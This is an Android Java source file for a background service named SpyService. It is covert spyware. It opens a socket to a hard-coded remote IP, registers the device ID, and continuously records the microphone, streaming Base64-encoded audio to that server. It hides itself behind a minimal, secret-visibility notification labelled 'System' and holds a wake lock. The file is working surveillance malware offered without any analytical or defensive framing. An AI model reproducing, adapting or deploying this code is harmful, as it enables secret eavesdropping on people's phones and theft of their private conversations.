package com.system.phantom;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;

import java.io.OutputStream;
import java.net.Socket;

public class SpyService extends Service {
    private static final String SERVER_IP = "100.110.145.108";
    private static final int SERVER_PORT = 5000;
    private String deviceId;
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private Thread audioThread;
    private Socket socket;
    private OutputStream out;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PhantomLock");
        wakeLock.acquire(10 * 60 * 1000L);
        startForeground(9999, createNotification());
        connectToServer();
        startAudioStreaming();
    }

    private void connectToServer() {
        new Thread(() -> {
            try {
                socket = new Socket(SERVER_IP, SERVER_PORT);
                out = socket.getOutputStream();
                out.write(("REGISTER|" + deviceId + "\n").getBytes());
                out.flush();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void sendData(String data) {
        new Thread(() -> {
            try {
                if (out != null) {
                    out.write((data + "\n").getBytes());
                    out.flush();
                }
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void startAudioStreaming() {
        if (isRecording) return;
        int bufferSize = AudioRecord.getMinBufferSize(8000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 8000, AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2);
        isRecording = true;
        audioThread = new Thread(() -> {
            byte[] buffer = new byte[bufferSize];
            while (isRecording) {
                int read = audioRecord.read(buffer, 0, buffer.length);
                if (read > 0) {
                    String b64 = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
                    sendData("AUDIO|" + b64);
                }
                try { Thread.sleep(50); } catch (Exception e) {}
            }
        });
        audioRecord.startRecording();
        audioThread.start();
    }

    private Notification createNotification() {
        String channelId = "phantom_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }
        return new Notification.Builder(this, channelId)
                .setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_SECRET)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRecording = false;
        if (audioRecord != null) audioRecord.stop();
        try { if (socket != null) socket.close(); } catch (Exception e) {}
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
